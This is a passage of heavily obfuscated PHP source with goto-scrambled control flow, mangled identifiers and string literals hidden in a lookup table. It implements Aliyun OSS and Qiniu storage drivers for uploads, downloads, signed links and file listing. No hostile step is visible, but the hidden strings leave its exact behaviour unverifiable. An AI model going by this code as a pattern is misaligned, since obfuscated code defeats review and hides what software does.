return $B†Ù×²»ø ; goto D¹Î„ÍÚ»; F•ğÌ­¹Äå: $eƒ«ºÇ¶¾ = strpos($D¬›ªáÀ©’, $cñÄäˆçÊ‡[294]); $D¬›ªáÀ©’ = substr($D¬›ªáÀ©’, 0, $eƒ«ºÇ¶¾) . $cñÄäˆçÊ‡[1283]; $BÊÖìÎ¡“Ç = 1048576000 * 5; goto eÀ„²“®ğì; Eí¸–©®ì…: $Aª¯ïœ®”‘ = date($cñÄäˆçÊ‡[1282], time() + $fÇ¢öÄ¢ÕË); $CĞ‚ä·‹‰ = new DateTime($Aª¯ïœ®”‘); $D¬›ªáÀ©’ = $CĞ‚ä·‹‰->format(DateTime::ISO8601); goto F•ğÌ­¹Äå; eÀ„²“®ğì: $BĞ¢°Î‘Æ = $this->pathFather($aƒ‘îßâ‘‘); $C±çÀğ–á = array($cñÄäˆçÊ‡[1182] => $D¬›ªáÀ©’, $cñÄäˆçÊ‡[1183] => array(array($cñÄäˆçÊ‡[1284], 0, $BÊÖìÎ¡“Ç), array($cñÄäˆçÊ‡[1186], $cñÄäˆçÊ‡[1187], $BĞ¢°Î‘Æ))); $CËÀøËÂ¹‰ = base64_encode(json_encode($C±çÀğ–á)); goto d‡Ò¦¾Ù¯á; b›øåË§œÍ: $cñÄäˆçÊ‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!($C—è©¶éÀó = $this->getHost())) { return !1; } $fÇ¢öÄ¢ÕË = $eíÕ¼³´«; goto Eí¸–©®ì…; D¹Î„ÍÚ»: } public function multiUploadFormData($dĞÎï¬’Ú, $E»­ÈÑ‰¥Ö = 3600) { $Eßåóêá =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!($BÃ¢µïÉ˜Ø = $this->getHost())) { return !1; } $d‰Œ›Ïğ» = $this->trafficLimit($Eßåóêá[1279]); $E„Ò¤áÏ“‰ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($dĞÎï¬’Ú), $d‰Œ›Ïğ»); return array($Eßåóêá[221] => $E„Ò¤áÏ“‰, $Eßåóêá[175] => $BÃ¢µïÉ˜Ø . $Eßåóêá[8] . $this->pathEncode($dĞÎï¬’Ú), $Eßåóêá[222] => gmdate($Eßåóêá[1287]), $Eßåóêá[93] => $dĞÎï¬’Ú); } public function multiUploadAuthData($bİ”Üò£…, $a£•º¯µ¨ = array()) { goto D×Ö¶É÷ºó; D×Ö¶É÷ºó: $Aáâ¢¡µÔç =& $_SERVER[ÒÆ›ÆØÎ¾]; $bğÍ™‚ì„Ï = isset($a£•º¯µ¨[$Aáâ¢¡µÔç[222]]) ? $a£•º¯µ¨[$Aáâ¢¡µÔç[222]] : gmdate($Aáâ¢¡µÔç[1287]); $cè›¯¼©  = isset($a£•º¯µ¨[$Aáâ¢¡µÔç[168]]) ? $a£•º¯µ¨[$Aáâ¢¡µÔç[168]] : $Aáâ¢¡µÔç[33]; goto aÈøâ ™Û¬; E½Í¦®Ò: $bôŞ¶ÛÍÙÆ = $Aáâ¢¡µÔç[1252] . $this->accessKey . $Aáâ¢¡µÔç[4] . $cäŠ³³¼ºï; if (strpos($cè›¯¼© , $Aáâ¢¡µÔç[225]) === 0) { $bôŞ¶ÛÍÙÆ = array($Aáâ¢¡µÔç[232] => $bôŞ¶ÛÍÙÆ, $Aáâ¢¡µÔç[222] => $bğÍ™‚ì„Ï); if ($fù²ß°ê÷Ã) { $bôŞ¶ÛÍÙÆ = array_merge($bôŞ¶ÛÍÙÆ, $fù²ß°ê÷Ã); } } return $bôŞ¶ÛÍÙÆ; goto aÒ×Í§Œä¥; cËŠÃÁ±Çœ: if (!empty($a£•º¯µ¨[$Aáâ¢¡µÔç[1289]])) { $dˆÓ°½²Â = array_merge(array($Bİ˜Û¿èÙò[4]), $a£•º¯µ¨[$Aáâ¢¡µÔç[1289]]); sort($dˆÓ°½²Â); $Bİ˜Û¿èÙò[4] = implode($Aáâ¢¡µÔç[229], $dˆÓ°½²Â); } $FÓóà„¿„¡ = implode($Aáâ¢¡µÔç[229], $Bİ˜Û¿èÙò); $cäŠ³³¼ºï = base64_encode(hash_hmac($Aáâ¢¡µÔç[230], $FÓóà„¿„¡, $this->secret, !0)); goto E½Í¦®Ò; c™«›¸íÏÈ: $Bİ˜Û¿èÙò = array($Aáâ¢¡µÔç[224], $Aáâ¢¡µÔç[33], $Aáâ¢¡µÔç[119], $bğÍ™‚ì„Ï, "\x78\55\x6f\x73\163\55\x64\141\164\x65\x3a{$bğÍ™‚ì„Ï}", $Aáâ¢¡µÔç[8] . $this->bucket . $Aáâ¢¡µÔç[8] . $fŒùğŒã . $cè›¯¼© ); if (strpos($cè›¯¼© , $Aáâ¢¡µÔç[225]) === 0) { $Bİ˜Û¿èÙò[0] = $Aáâ¢¡µÔç[226]; if ($fù²ß°ê÷Ã = $this->trafficLimit($Aáâ¢¡µÔç[1279])) { $fŒùğŒã = $Aáâ¢¡µÔç[1288]; array_splice($Bİ˜Û¿èÙò, 5, 0, $fŒùğŒã . $Aáâ¢¡µÔç[4] . $fù²ß°ê÷Ã[$fŒùğŒã]); } } if (isset($a£•º¯µ¨[$Aáâ¢¡µÔç[227]]) && $a£•º¯µ¨[$Aáâ¢¡µÔç[227]] == $Aáâ¢¡µÔç[228]) { $Bİ˜Û¿èÙò[0] = $Aáâ¢¡µÔç[228]; } goto cËŠÃÁ±Çœ; aÈøâ ™Û¬: $fŒùğŒã = $bİ”Üò£…; if (isset($a£•º¯µ¨[$Aáâ¢¡µÔç[93]])) { $fŒùğŒã = $a£•º¯µ¨[$Aáâ¢¡µÔç[93]]; unset($a£•º¯µ¨[$Aáâ¢¡µÔç[93]]); } if (isset($a£•º¯µ¨[$Aáâ¢¡µÔç[223]])) { $a£•º¯µ¨[$Aáâ¢¡µÔç[222]] = $bğÍ™‚ì„Ï; return $this->listUploadParts($fŒùğŒã, $a£•º¯µ¨); } goto c™«›¸íÏÈ; aÒ×Í§Œä¥: } public function listUploadParts($eôóæµ„, $c²ÕÂ¹ˆ†‘) { goto C­™¬´ò›á; Eä¡ğ¼èÃ¾: unset($c²ÕÂ¹ˆ†‘[$DÏÏ™¯ŸÂÀ[223]], $c²ÕÂ¹ˆ†‘[$DÏÏ™¯ŸÂÀ[227]]); $EÃ“ÑˆçœÇ = $this->multiUploadAuthData($eôóæµ„, $c²ÕÂ¹ˆ†‘); if (empty($EÃ“ÑˆçœÇ)) { return !1; } goto bÔ±¾ÃÑ©”; fÃÉÙ´‰Ö: $f¤…óÜùÎ = $Fƒ»ÁµÚË’->getListPart(); $Dì—•´ßÊÛ = array(); foreach ($f¤…óÜùÎ as $C“ ¡ÒÊÄ¾) { $Dì—•´ßÊÛ[] = array($DÏÏ™¯ŸÂÀ[1272] => $C“ ¡ÒÊÄ¾->getPartNumber(), $DÏÏ™¯ŸÂÀ[1273] => trim($C“ ¡ÒÊÄ¾->getETag(), $DÏÏ™¯ŸÂÀ[116])); } goto Eä¡ğ¼èÃ¾; bÔ±¾ÃÑ©”: return array($DÏÏ™¯ŸÂÀ[232] => $EÃ“ÑˆçœÇ, $DÏÏ™¯ŸÂÀ[222] => $c²ÕÂ¹ˆ†‘[$DÏÏ™¯ŸÂÀ[222]], $DÏÏ™¯ŸÂÀ[234] => $Dì—•´ßÊÛ); goto aƒ Ï¸ŒÑ˜; C­™¬´ò›á: $DÏÏ™¯ŸÂÀ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AğàÄá‚èÇ = parse_url_query($c²ÕÂ¹ˆ†‘[$DÏÏ™¯ŸÂÀ[168]]); $Fƒ»ÁµÚË’ = $this->client->listParts($this->bucket, $this->pathEncode($eôóæµ„), $AğàÄá‚èÇ[$DÏÏ™¯ŸÂÀ[221]]); goto fÃÉÙ´‰Ö; aƒ Ï¸ŒÑ˜: } public function download($AøäÔ˜¿ö², $E‚‡¥‰µ™À) { if ($this->isFolder($AøäÔ˜¿ö²)) { return !1; } try { $bŒ’Ä±øá = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $E‚‡¥‰µ™À); $bŒ’Ä±øá = $this->trafficLimit($_SERVER[ÒÆ›ÆØÎ¾][109], $bŒ’Ä±øá); $this->client->getObject($this->bucket, $this->pathEncode($AøäÔ˜¿ö²), $bŒ’Ä±øá); } catch (OSS\Core\OssException $cÜ©¯µ–‘—) { return !1; } return $E‚‡¥‰µ™À; } public function fileSubstr($fºÂ¼Àôò, $d†›×ŞİÖ¨ = 0, $CÑĞ—µÒ¿š = false) { if ($d†›×ŞİÖ¨ === -1) { $CÌé¾ğ¨… = array(); } else { if ($CÑĞ—µÒ¿š === !1) { $E´öÏ«äÄ = $this->size($fºÂ¼Àôò); } else { $E´öÏ«äÄ = $d†›×ŞİÖ¨ + $CÑĞ—µÒ¿š - 1; } $CÌé¾ğ¨… = array(OSS\OssClient::OSS_RANGE => "{$d†›×ŞİÖ¨}\55{$E´öÏ«äÄ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fºÂ¼Àôò), $CÌé¾ğ¨…); } catch (OSS\Core\OssException $B»åÄÁêâ) { think_exception($B»åÄÁêâ->getMessage()); return !1; } } private function trafficLimit($EÁ·³ê·ÌĞ, $EÂâ®ñ†é¹ = array()) { goto aì»–ô˜‡; Aà‹¡÷™õ: return $EÂâ®ñ†é¹; goto bïÃÊ¼á°; EÍ›â—Éô’: if (!$eŞ‚ˆè¤½†) { return $EÂâ®ñ†é¹; } $eŞ‚ˆè¤½† = $eŞ‚ˆè¤½† < 819200 ? 819200 : ($eŞ‚ˆè¤½† > 838860800 ? 838860800 : $eŞ‚ˆè¤½†); $EÂâ®ñ†é¹[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($eŞ‚ˆè¤½†); goto Aà‹¡÷™õ; aì»–ô˜‡: $EÖÂÏ“„°Ö =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($EÁ·³ê·ÌĞ == $EÖÂÏ“„°Ö[1279] && $this->isUploadServer() || $EÁ·³ê·ÌĞ == $EÖÂÏ“„°Ö[109] && $this->isFileOutServer()) { return $EÂâ®ñ†é¹; } $eŞ‚ˆè¤½† = floatval($GLOBALS[$EÖÂÏ“„°Ö[6]][$EÖÂÏ“„°Ö[88]][$EÖÂÏ“„°Ö[107]][$EÁ·³ê·ÌĞ]) * 1024 * 1024 * 8; goto EÍ›â—Éô’; bïÃÊ¼á°: } public function link($Bé”†¾£â‰, $Aæ‚¬•Ğ× = array()) { $EÍ×‹ÃÂ‡­ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->exist($Bé”†¾£â‰) || $this->isFolder($Bé”†¾£â‰)) { return !1; } try { $Aæ‚¬•Ğ× = $this->trafficLimit($EÍ×‹ÃÂ‡­[109], $Aæ‚¬•Ğ×); $eô ÂâÏ = $this->client->signUrl($this->bucket, $this->pathEncode($Bé”†¾£â‰), 3600 * 12, $EÍ×‹ÃÂ‡­[228], $Aæ‚¬•Ğ×); return $this->getCdnLink($eô ÂâÏ); } catch (OSS\Core\OssException $A–ó¥ë««¥) { return !1; } } public function fileOut($eƒ£áôÉ•È, $eº·ŸšÃË‡ = false, $B¸‚á¶ƒ¡† = false, $cŠİõË•ëˆ = '') { goto f¦Š­¹‹’é; d³§º©»¤§: $eº·ŸšÃË‡ = $eº·ŸšÃË‡ ? $Fƒ¼šñ [214] : $Fƒ¼šñ [215]; $f–Ğìô“‘ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Fƒ¼šñ [1290] . rawurlencode("{$eº·ŸšÃË‡}\73\x66\x69\154\x65\x6e\141\155\145\x3d{$B¸‚á¶ƒ¡†}")); $f–Ğìô“‘[OSS\OssClient::OSS_SUB_RESOURCE] .= $Fƒ¼šñ [1291] . rawurlencode($fÁ÷é ¬ë); goto eÃÛ©²Á•¤; eÃÛ©²Á•¤: $Aöà·İŠŸ = $this->link($eƒ£áôÉ•È, $f–Ğìô“‘); $this->fileOutLink($Aöà·İŠŸ); goto Eñ«È„—¼´; f¦Š­¹‹’é: $Fƒ¼šñ  =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->isFileOutServer()) { return $this->fileOutServer($eƒ£áôÉ•È, $eº·ŸšÃË‡, $B¸‚á¶ƒ¡†, $cŠİõË•ëˆ); } if (!$B¸‚á¶ƒ¡†) { $B¸‚á¶ƒ¡† = $this->pathThis($eƒ£áôÉ•È); } goto cø‚µ‘×Ò‰; cø‚µ‘×Ò‰: $B¸‚á¶ƒ¡† = rawurlencode($B¸‚á¶ƒ¡†); $fÁ÷é ¬ë = get_file_mime(get_path_ext($B¸‚á¶ƒ¡†)); if ($fÁ÷é ¬ë == $Fƒ¼šñ [213]) { return parent::fileOut($eƒ£áôÉ•È, $eº·ŸšÃË‡, $B¸‚á¶ƒ¡†, $cŠİõË•ëˆ); } goto d³§º©»¤§; Eñ«È„—¼´: } public function fileOutServer($bõóŒÃ¶ç, $c—çºÊÕÅ = false, $Dš ‰¤ Æ = false, $bù£”¯ŠêÎ = '') { parent::fileOut($bõóŒÃ¶ç, $c—çºÊÕÅ, $Dš ‰¤ Æ, $bù£”¯ŠêÎ); } public function fileOutImage($F–ÔÚË—¯, $c’‹£ãÕğå = 250) { $fåòØÔêƒ  = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÒÆ›ÆØÎ¾][1292] . $c’‹£ãÕğå); $aöôŒøÄÈÖ = $this->link($F–ÔÚË—¯, $fåòØÔêƒ ); $this->fileOutLink($aöôŒøÄÈÖ); } public function fileOutImageServer($E”ö°Š¿Å, $Aéçš´Ù¾Ï = 250) { parent::fileOutImage($E”ö°Š¿Å, $Aéçš´Ù¾Ï); } public function fileOutLink($F»†Š¿¬ƒ‚) { $có“¾ÄˆŠ¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->isCdnHost() && substr($F»†Š¿¬ƒ‚, 0, 7) == $có“¾ÄˆŠ¶[1195]) { $F»†Š¿¬ƒ‚ = $có“¾ÄˆŠ¶[1196] . substr($F»†Š¿¬ƒ‚, 7); } header($có“¾ÄˆŠ¶[159] . $F»†Š¿¬ƒ‚); die; } public function hashMd5($b˜™»ˆ”, $b˜Î©˜È†Ï = '') { $dË‚ÏÒ™ÉØ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a»­Ç‚ = $this->_objectMeta($b˜™»ˆ”); if (!$a»­Ç‚) { return $dË‚ÏÒ™ÉØ[33]; } if (!isset($a»­Ç‚[$dË‚ÏÒ™ÉØ[1268]]) && !empty($b˜Î©˜È†Ï)) { $e¤¬ÕÉ…¥ = $this->updateObjMeta($b˜™»ˆ”, array($dË‚ÏÒ™ÉØ[1268] => $b˜Î©˜È†Ï)); $a»­Ç‚[$dË‚ÏÒ™ÉØ[1268]] = $e¤¬ÕÉ…¥ ? $b˜Î©˜È†Ï : $dË‚ÏÒ™ÉØ[33]; } return isset($a»­Ç‚[$dË‚ÏÒ™ÉØ[1268]]) ? strtolower($a»­Ç‚[$dË‚ÏÒ™ÉØ[1268]]) : $dË‚ÏÒ™ÉØ[33]; } public function size($a ¦ŞÑùÏå) { $FƒöµŠœ´° = $this->objectMeta($a ¦ŞÑùÏå); return $FƒöµŠœ´° ? $FƒöµŠœ´°[$_SERVER[ÒÆ›ÆØÎ¾][78]] : 0; } public function info($aŒƒÏ Ë´å) { if ($this->isFolder($aŒƒÏ Ë´å)) { return $this->folderInfo($aŒƒÏ Ë´å); } else { if ($this->isFile($aŒƒÏ Ë´å)) { return $this->fileInfo($aŒƒÏ Ë´å); } } return !1; } public function exist($a‡ğ²³öÁ) { return $this->isFile($a‡ğ²³öÁ) || $this->isFolder($a‡ğ²³öÁ); } public function isFile($AèÓ–´¥Ö) { return !$this->isFolder($AèÓ–´¥Ö) && $this->objectMeta($AèÓ–´¥Ö); } public function isFolder($e¯Ò­÷¾…æ) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][199], $e¯Ò­÷¾…æ); } protected function objectMeta($e”¶•Ã¶‹ã) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][200], $e”¶•Ã¶‹ã); } protected function _objectMeta($d÷³Â’¯«) { $C­„À´ÇÈ¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; try { $AĞ¨É’¹°‹ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d÷³Â’¯«)); } catch (OSS\Core\OssException $Eê»•ô×î™) { $AĞ¨É’¹°‹ = !1; } if ($AĞ¨É’¹°‹) { $AĞ¨É’¹°‹[$C­„À´ÇÈ¦[78]] = intval($AĞ¨É’¹°‹[$C­„À´ÇÈ¦[1266]]); } return $AĞ¨É’¹°‹; } protected function _isFolder($Fš°Ëö¤ºâ) { $bğê…°¨òŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($Fš°Ëö¤ºâ == $bğê…°¨òŠ[33] || $Fš°Ëö¤ºâ == $bğê…°¨òŠ[8]) { return !0; } $Bá¾·ÖÔî = array($bğê…°¨òŠ[1262] => $bğê…°¨òŠ[8], $bğê…°¨òŠ[1263] => rtrim($Fš°Ëö¤ºâ, $bğê…°¨òŠ[8]) . $bğê…°¨òŠ[8], $bğê…°¨òŠ[1264] => 1, $bğê…°¨òŠ[1265] => $bğê…°¨òŠ[33]); $EÑÜÜ®½ÁŞ = $this->client->listObjects($this->bucket, $Bá¾·ÖÔî); if ($EÑÜÜ®½ÁŞ->getObjectList() || $EÑÜÜ®½ÁŞ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($fğ¨ÛŞÁìÊ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÒÆ›ÆØÎ¾][1293]; $this->_init($fğ¨ÛŞÁìÊ); } public function _init($e§ÔÙô‚ÂÀ) { goto fİ½¨ŸÙõâ; e—ùÈ…†Ïñ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto eİœ‘„®‹Í; d†×ÁÆù‡î: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto e—ùÈ…†Ïñ; fİ½¨ŸÙõâ: $cŒòƒç¥Äã =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($e§ÔÙô‚ÂÀ as $E¦Ñ×ß÷ => $F¥«‰ß—) { if (isset($this->{$E¦Ñ×ß÷})) { $this->{$E¦Ñ×ß÷} = $F¥«‰ß—; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($cŒòƒç¥Äã[1294] . LNG($cŒòƒç¥Äã[1253])); } goto d†×ÁÆù‡î; eİœ‘„®‹Í: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($E³¯ºÓ´ê, $e©ÒœõŠô‹ = '', $d‚ƒÁîãò‡ = REPEAT_RENAME) { if ($this->setContent($E³¯ºÓ´ê, $e©ÒœõŠô‹)) { return $this->getPathOuter($E³¯ºÓ´ê); } return !1; } public function mkdir($C«ÒÄ„­ğ±, $eê…ô¾–âæ = REPEAT_SKIP) { goto b±Òš„¿; F‰¢½±â²: if (!$this->mkfile($C‚Ï‘èİª)) { return !1; } if (!$this->moveFile($C‚Ï‘èİª, $C«ÒÄ„­ğ±)) { $this->delFile($C‚Ï‘èİª); return !1; } return $this->getPathOuter($EçÂˆ‡©â÷); goto EÂ¾ÍĞÉ; b±Òš„¿: $eŠ†‡áíæÚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EçÂˆ‡©â÷ = trim($C«ÒÄ„­ğ±, $eŠ†‡áíæÚ[8]); if ($this->_isFolder($EçÂˆ‡©â÷)) { return $this->getPathOuter($EçÂˆ‡©â÷); } goto cŠ–³¾®ÔÍ; cŠ–³¾®ÔÍ: $C«ÒÄ„­ğ± = $EçÂˆ‡©â÷ . $eŠ†‡áíæÚ[8]; $A¥„Á†£¶İ = get_path_this($EçÂˆ‡©â÷); $C‚Ï‘èİª = $C«ÒÄ„­ğ± . $A¥„Á†£¶İ; goto F‰¢½±â²; EÂ¾ÍĞÉ: } public function copyFile($E£Îç¼‡Ãí, $F°—µ¡ÚÄ÷) { $AŞ è½¼ŒÕ = $this->bucketManager->copy($this->bucket, $E£Îç¼‡Ãí, $this->bucket, $F°—µ¡ÚÄ÷, !0); return $AŞ è½¼ŒÕ ? !1 : $this->getPathOuter($F°—µ¡ÚÄ÷); } public function moveFile($EñïéĞ£º, $F‹ÄˆÊ”‰Ö) { $AÄø¯Œ»½ = $this->bucketManager->move($this->bucket, $EñïéĞ£º, $this->bucket, $F‹ÄˆÊ”‰Ö, !0); return $AÄø¯Œ»½ ? !1 : $this->getPathOuter($F‹ÄˆÊ”‰Ö); } public function delFile($E’º¯ôñ œ) { if (!$this->exist($E’º¯ôñ œ)) { return !0; } $b“‘Çåá‡í = $this->bucketManager->delete($this->bucket, $E’º¯ôñ œ); return $b“‘Çåá‡í ? !1 : !0; } public function delFolder($C™­ùÓ©»ë) { goto eÛ¿Çš£Æã; BËãˆî÷«î: if (!empty($C™­ùÓ©»ë) && $C™­ùÓ©»ë !== $aÊ‡ÜéÕ…Ø[191] && !in_array($F…ÅÄµ’, $bÃ¹œ£»¶[$aÊ‡ÜéÕ…Ø[75]])) { $bÃ¹œ£»¶[$aÊ‡ÜéÕ…Ø[75]][] = $F…ÅÄµ’; } $a¬è®Ï©Ü = $this->delByBatch($bÃ¹œ£»¶[$aÊ‡ÜéÕ…Ø[74]]); if (!$a¬è®Ï©Ü) { return !1; } goto DŸğ‡¯—; DŸğ‡¯—: $a¬è®Ï©Ü = $this->delByBatch($bÃ¹œ£»¶[$aÊ‡ÜéÕ…Ø[75]]); if (!$a¬è®Ï©Ü) { return !1; } return $this->delFile($F…ÅÄµ’); goto f‹¾œˆäÄ¢; eÛ¿Çš£Æã: $aÊ‡ÜéÕ…Ø =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->exist($C™­ùÓ©»ë)) { return !0; } $this->listItemCache = !1; goto D…õÈ‹é“Ã; D…õÈ‹é“Ã: $bÃ¹œ£»¶ = $this->fileList($C™­ùÓ©»ë); $this->listItemCache = !0; $F…ÅÄµ’ = trim($C™­ùÓ©»ë, $aÊ‡ÜéÕ…Ø[8]) . $aÊ‡ÜéÕ…Ø[8]; goto BËãˆî÷«î; f‹¾œˆäÄ¢: } private function delByBatch($CÔØ£Ì’®¸) { foreach (array_chunk($CÔØ£Ì’®¸, 1000) as $bôßæØÜ) { $B“ÃÑ¶çÄ¢ = $this->bucketManager->buildBatchDelete($this->bucket, $bôßæØÜ); list($EºÙÙŸ»È¡, $fƒ´…ÛÎ¥µ) = $this->bucketManager->batch($B“ÃÑ¶çÄ¢); if ($fƒ´…ÛÎ¥µ) { return !1; } } return !0; } public function rename($eµ¼…¢Ã¾, $FÑ×ÃéËÍ¶) { return $this->renameObject($eµ¼…¢Ã¾, $FÑ×ÃéËÍ¶); } public function fileInfo($fÓ±‘ğããŠ, $Cë“ÍŒ°„† = false, $CĞ´œå» = array()) { goto Cá²’¾Ø‚œ; F‡–±¯ˆ’¦: $c©á¡‡„È¬[$EÎº‰µã½[194]] = $c©á¡‡„È¬[$EÎº‰µã½[84]] = 0; $c©á¡‡„È¬[$EÎº‰µã½[195]] = $c©á¡‡„È¬[$EÎº‰µã½[196]] = !0; if (empty($CĞ´œå»)) { $CĞ´œå» = $this->objectMeta($fÓ±‘ğããŠ); if (!$CĞ´œå») { return $c©á¡‡„È¬; } } goto f£¯¡‹‚åæ; f£¯¡‹‚åæ: if (isset($CĞ´œå»[$EÎº‰µã½[1296]])) { $c©á¡‡„È¬[$EÎº‰µã½[84]] = substr($CĞ´œå»[$EÎº‰µã½[1296]] . $EÎº‰µã½[33], 0, 10); } if (isset($CĞ´œå»[$EÎº‰µã½[1295]])) { $c©á¡‡„È¬[$EÎº‰µã½[78]] = $CĞ´œå»[$EÎº‰µã½[1295]]; } return $c©á¡‡„È¬; goto e¼Èæ¿Øç÷; Cá²’¾Ø‚œ: $EÎº‰µã½ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c©á¡‡„È¬ = array($EÎº‰µã½[28] => $this->pathThis($fÓ±‘ğããŠ), $EÎº‰µã½[76] => $this->getPathOuter($EÎº‰µã½[8] . $fÓ±‘ğããŠ), $EÎº‰µã½[29] => $EÎº‰µã½[193], $EÎº‰µã½[78] => isset($CĞ´œå»[$EÎº‰µã½[1295]]) ? $CĞ´œå»[$EÎº‰µã½[1295]] : 0, $EÎº‰µã½[168] => $this->ext($fÓ±‘ğããŠ)); if ($Cë“ÍŒ°„†) { return $c©á¡‡„È¬; } goto F‡–±¯ˆ’¦; e¼Èæ¿Øç÷: } public function folderInfo($CíÙ ÏïØÃ, $aÒá¸Šé¾ì = false) { goto Fµ­¿ˆ¯Š–; B»¦ÈºŸŠœ: $bˆÕÕÌïæ’[$dÛ©Ğ‰Şæ[194]] = $bˆÕÕÌïæ’[$dÛ©Ğ‰Şæ[84]] = 0; $bˆÕÕÌïæ’[$dÛ©Ğ‰Şæ[195]] = $bˆÕÕÌïæ’[$dÛ©Ğ‰Şæ[196]] = !0; $CíÙ ÏïØÃ = rtrim($CíÙ ÏïØÃ, $dÛ©Ğ‰Şæ[8]) . $dÛ©Ğ‰Şæ[8]; goto FÊÖÈ¨÷ô; FÊÖÈ¨÷ô: $a¨–„šÓ–Ù = $this->objectMeta($CíÙ ÏïØÃ); if (isset($a¨–„šÓ–Ù[$dÛ©Ğ‰Şæ[1296]])) { $bˆÕÕÌïæ’[$dÛ©Ğ‰Şæ[84]] = substr($a¨–„šÓ–Ù[$dÛ©Ğ‰Şæ[1296]] . $dÛ©Ğ‰Şæ[33], 0, 10); } return $bˆÕÕÌïæ’; goto a’ñ“—Ç¥´; Fµ­¿ˆ¯Š–: $dÛ©Ğ‰Şæ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bˆÕÕÌïæ’ = array($dÛ©Ğ‰Şæ[28] => $this->pathThis($CíÙ ÏïØÃ), $dÛ©Ğ‰Şæ[76] => $this->getPathOuter($dÛ©Ğ‰Şæ[8] . $CíÙ ÏïØÃ), $dÛ©Ğ‰Şæ[29] => $dÛ©Ğ‰Şæ[77]); if ($aÒá¸Šé¾ì) { return $bˆÕÕÌïæ’; } goto B»¦ÈºŸŠœ; a’ñ“—Ç¥´: } public function listPath($B ¾¹àô×Ï, $aÔôÔÔî³“ = false) { $aŒ„‰®ˆÍ° =& $_SERVER[ÒÆ›ÆØÎ¾]; $f„ƒì±§ëá = $this->fileList($B ¾¹àô×Ï, $aŒ„‰®ˆÍ°[8], !0); foreach ($f„ƒì±§ëá[$aŒ„‰®ˆÍ°[75]] as $B£ƒµĞ–™ => $Bä± †‘î©) { $f„ƒì±§ëá[$aŒ„‰®ˆÍ°[75]][$B£ƒµĞ–™] = $this->folderInfo($Bä± †‘î©, $aÔôÔÔî³“); } foreach ($f„ƒì±§ëá[$aŒ„‰®ˆÍ°[74]] as $B£ƒµĞ–™ => $Bä± †‘î©) { $f„ƒì±§ëá[$aŒ„‰®ˆÍ°[74]][$B£ƒµĞ–™] = $this->fileInfo($Bä± †‘î©[$aŒ„‰®ˆÍ°[93]], $aÔôÔÔî³“, $Bä± †‘î©); } return $f„ƒì±§ëá; } public function has($eã¾‘¦î°º, $b¹Ã®š·ÓÆ = false, $Dğ‰½ĞõÕ† = true) { goto a±¹Ğì¯Ğ; bÁÖãßæâë: $c·İ˜ˆÛù– = $D™‹§ÖŞ½[33]; $C¯İè–ÈŠ = 500; $a§È¾ŠÓ = $D™‹§ÖŞ½[8]; goto AåóÌ³É±î; AÃ†ÖÜ›Ç: return !1; goto CÆˆ”««Ô¾; a±¹Ğì¯Ğ: $D™‹§ÖŞ½ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eã¾‘¦î°º = trim($eã¾‘¦î°º, $D™‹§ÖŞ½[8]); $EßÔïóöªØ = empty($eã¾‘¦î°º) && $eã¾‘¦î°º !== $D™‹§ÖŞ½[191] ? $D™‹§ÖŞ½[33] : $eã¾‘¦î°º . $D™‹§ÖŞ½[8]; goto bÁÖãßæâë; AåóÌ³É±î: $D—‹Ô‡ÖÌ = $d‘¦ëî”¢» = 0; while (!0) { check_abort(); list($FÎŒÑ·¾ŸÒ, $Bçøø••é¬) = $this->bucketManager->listFiles($this->bucket, $EßÔïóöªØ, $c·İ˜ˆÛù–, $C¯İè–ÈŠ, $a§È¾ŠÓ); if ($Bçøø••é¬) { break; } $c·İ˜ˆÛù– = array_key_exists($D™‹§ÖŞ½[1265], $FÎŒÑ·¾ŸÒ) ? $c·İ˜ˆÛù– = $FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1297]] : $D™‹§ÖŞ½[33]; if ($b¹Ã®š·ÓÆ) { if (!empty($FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1298]])) { $D—‹Ô‡ÖÌ += count($FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1298]]); } if (!empty($FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1299]])) { $d‘¦ëî”¢» += count($FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1299]]); } if ($c·İ˜ˆÛù– === $D™‹§ÖŞ½[33]) { break; } continue; } if ($Dğ‰½ĞõÕ†) { if (!empty($FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1298]])) { return !0; } } else { if (!empty($FÎŒÑ·¾ŸÒ[$D™‹§ÖŞ½[1299]])) { return !0; } } if 